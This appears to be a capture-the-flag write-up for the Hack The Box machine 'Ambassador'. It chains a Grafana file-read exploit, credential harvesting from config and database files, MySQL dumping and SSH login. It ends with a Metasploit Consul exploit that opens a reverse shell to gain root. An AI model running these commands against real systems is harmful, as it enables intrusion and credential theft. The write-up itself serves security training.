Target:10.10.11.182     Ambassador

**Initial Access:**\
nmap 10.10.11.183 -Pn --min-rate=5000 -p-\
Output shows open ports of 22,80,3000,3306

Enumerating these open ports further with nmap:\
nmap 10.10.11.183 -Pn --min-rate=5000 -p 22,80,3000,3306 -sC -sV -oN nmap.ambassador\
Ouput shows: 

PORT     STATE SERVICE VERSION\
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\
| ssh-hostkey: \
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)\
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)\
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)\
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\
|_http-generator: Hugo 0.94.2\
|_http-title: Ambassador Development Server\
|_http-server-header: Apache/2.4.41 (Ubuntu)\
3000/tcp open  ppp?\
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2

Navigating to port 3000 website redirects us to a /login directory which is a login page.  The page shows that it is running Grafana, and at the bottom right it shows the version is 8.2:

![image](https://user-images.githubusercontent.com/93153300/198725813-8e518d6d-be2f-40a3-b391-ac0884544b2a.png)
  
Let’s check for exploits on grafana:  searchsploit grafana\
searchsploit finds a directory traversal and arbitrary file read:\
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read           | multiple/webapps/50581.py\
Download the exploit:   searchsploit -m 50581.py

Opening the exploit and reading through it shows: 

![image](https://user-images.githubusercontent.com/93153300/198725877-c284a75c-eeb8-4832-8230-07f3bcac6cc8.png)

This confirms that our grafana version 8.2 should work for this exploit.\
Run the exploit: python 50581.py -H http://10.10.11.183:3000  → when prompted for file to read, enter  /etc/passwd for proof of concept:

![image](https://user-images.githubusercontent.com/93153300/198725913-59510f76-4be4-4cbe-b2aa-cc347fa28bc2.png)
 
It works, we get the users on the target.  Let’s try to find the password for the grafana login page.\
Google search ‘what directory is grafana credentials stored in’. \
Found that the credentials are stored in :  /etc/grafana/grafana.ini\
Use the exploit to read this file:  python grafana8.3.py -H http://10.10.11.183:3000  → when prompts for the file to read enter:  /etc/grafana/grafana.ini\
Output is quite a lot, so let’s search for interesting words.  Use control f to search for the word password.  Found credentials: 

![image](https://user-images.githubusercontent.com/93153300/198725945-e84cda65-b1c9-4697-8994-696d2cbf89be.png)
 
The username is admin, password is messageInABottle685427 \
Log into http://10.10.11.183:3000/login with the credentials we found.  It works, we get logged in.

Navigating around the site for a while and not finding much of interest.  Let’s go back to our exploit and see if we can find something else.

Another page that comes up when you google search ‘what directory is grafana credentials stored in’ is /var/lib/grafana/grafana.db.  Run the exploit to read grafana.db file:\
python grafana8.3.py -H http://10.10.11.183:3000   → when prompted for the file to read, enter /var/lib/grafana/grafana.db

It returns a lot of output.  To save some time, use control f to search for keywords.  Searching for mysql immediately finds a username and password for mysql:

![image](https://user-images.githubusercontent.com/93153300/198726180-ae33e033-7c51-49df-b242-7fb8f58446ed.png)
Use these credentials (username grafana, password dontStandSoCloseToMe63221!) to log into mysql:    mysql -h 10.10.11.183 -u grafana -p	→ when prompted for password enter the password.\
It works, we get logged in.   

![image](https://user-images.githubusercontent.com/93153300/198726117-aa4b0820-0282-408e-b593-a9d9ae343cd2.png)

Check the databases:   show databases;

![image](https://user-images.githubusercontent.com/93153300/198726209-bf34650e-1e63-476d-a7db-bb3bd2dee693.png)
 
Select whackywidget: use  whackywidget;\
Check the tables in whackywidget:  show tables;

![image](https://user-images.githubusercontent.com/93153300/198726226-d75d612f-e7c0-4e12-9f27-6d2b22c202c1.png)

Dump the information of table users:  select * from users;

![image](https://user-images.githubusercontent.com/93153300/198726242-80465b57-d9b1-441d-8ee8-3a549ee8e39d.png)

We found developer username and credentials.  Looks like the password is base64 encoded.  Decode it using command:  echo -n "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg=="|base64 -d\
Decoded to plaintext password: anEnglishManInNewYork027468

Let’s try to log into ssh with these credentials.

ssh developer@10.10.11.183   → enter password when prompted

We have shell as developer, open /home/developer/user.txt to get the flag.

![image](https://user-images.githubusercontent.com/93153300/198726260-dea161a5-5b46-4611-8b26-e1f6def77b93.png)
________________________________________________________
**Privilege Escalation:**\
Navigating around to differnet directories /opt has non standard files that leads to a .git.  Let’s check that out:   cd /opt/my-app/.git\
check the files with command:   git log\
Output shows a number of commits.  Commint c982db8eff6f10f8f3a7d802f79f2705e7a21b55 has a title of ‘config script’, config sometimes has interesting information, so let’s check that out:\
git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55\
The output shows a consul command with a token:

![image](https://user-images.githubusercontent.com/93153300/198726273-52beeaa3-7f9d-4072-bd3e-451fde5eb6ac.png)

Check if consul has an exploit with searchsploit:    searchsploit consul  → shows an exploit with metasploit. 

![image](https://user-images.githubusercontent.com/93153300/198726306-354c971b-2a87-4576-8c8b-7a68adb6fc0f.png)

Consul runs on port 8500, from our nmap at the beginning, we know that we do not have that port open.  Let’s check if it’s open on the target shell that we have:   netstat -ln

![image](https://user-images.githubusercontent.com/93153300/198726328-6b674bf3-5025-47cd-8aae-6641a313295d.png)


The output from netstat -ln shows that port 8500 is open but only from 127.0.0.1.  So to make this accessible to us we need to forward that port.   To get our target shell into the port forward: ~c .\  
Next: -L 4444:127.0.0.1:8500\
This means that whenever we go to our 127.0.0.1 at port 4444 then we will be redirected to the target 127.0.0.1 on port 8500.  

![image](https://user-images.githubusercontent.com/93153300/198726345-6c238382-df17-4948-9433-0dac504553ec.png)
Now that we have access to port 8500 on the target, we can continue to perform the exploit we found.  Open metasploit with command:   msfconsole -q. \
To find the exploit in metasploit run:\
search Hashicorp Consul Remote

![image](https://user-images.githubusercontent.com/93153300/198726358-ab07741f-c882-496a-8dee-bb4d7b22ddf3.png)

Choose the exloit:  use multi/misc/consul_service_exec\   
Fill out the exploit with the following commands:\
show options → set lhost tun0 → set lport 443 → set rhosts 127.0.0.1 → set rport 4444 → set acl_token  bb03b43b-1d81-d62b-24b5-39540ee469b5\
It should look like this:

![image](https://user-images.githubusercontent.com/93153300/198726372-89ecd2f6-84c8-48cd-966f-f0a71a1f8d5f.png)


To run the exploit use command: run
We have shell as root, open /root/root.txt to get the flag. 

![image](https://user-images.githubusercontent.com/93153300/198726401-f965cca4-e7b8-4e57-8ed8-c3594e3fd824.png)





